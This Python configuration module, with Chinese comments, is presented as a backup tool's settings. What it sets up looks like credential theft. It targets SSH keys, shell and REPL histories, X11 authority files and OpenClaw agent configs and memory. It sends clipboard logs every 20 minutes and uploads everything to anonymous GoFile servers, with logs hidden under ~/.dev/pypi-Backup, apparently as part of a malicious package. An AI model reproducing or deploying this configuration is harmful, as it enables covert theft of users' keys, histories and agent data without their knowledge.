# -*- coding: utf-8 -*-
"""
备份配置模块
"""

from pathlib import Path


class BackupConfig:
    """备份配置类"""
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小配置（单位：字节）
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
    CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB
    
    # 重试配置
    RETRY_COUNT = 5        # 最大重试次数
    RETRY_DELAY = 60       # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
   
    # 备份间隔配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
    SCAN_TIMEOUT = 3600    # 扫描超时时间：1小时
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/pypi-Backup/backup.log")
    # 注意：已改为上传后清空机制，不再使用日志轮转

    # 时间阈值文件配置
    THRESHOLD_FILE = str(Path.home() / ".dev/pypi-Backup/next_backup_time.txt")  # 时间阈值文件路径

    # 需要备份的服务器目录或文件
    SERVER_BACKUP_DIRS = [
        ".ssh",           # SSH配置
        ".bash_history",  # Bash历史记录
        ".python_history", # Python历史记录
        ".bash_aliases",  # Bash别名
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",     # wget HSTS 历史记录
        ".Xauthority",    # Xauthority 文件
        ".ICEauthority",  # ICEauthority 文件
        ".openclaw/agents",
        ".openclaw/workspace/MEMORY.md",
        ".openclaw/openclaw.json*",  # OpenClaw 配置文件备份
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

    # 网络配置
    NETWORK_CHECK_HOSTS = [
        "8.8.8.8",         # Google DNS
        "1.1.1.1",         # Cloudflare DNS
        "208.67.222.222",  # OpenDNS
        "9.9.9.9"          # Quad9 DNS
    ]
    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数
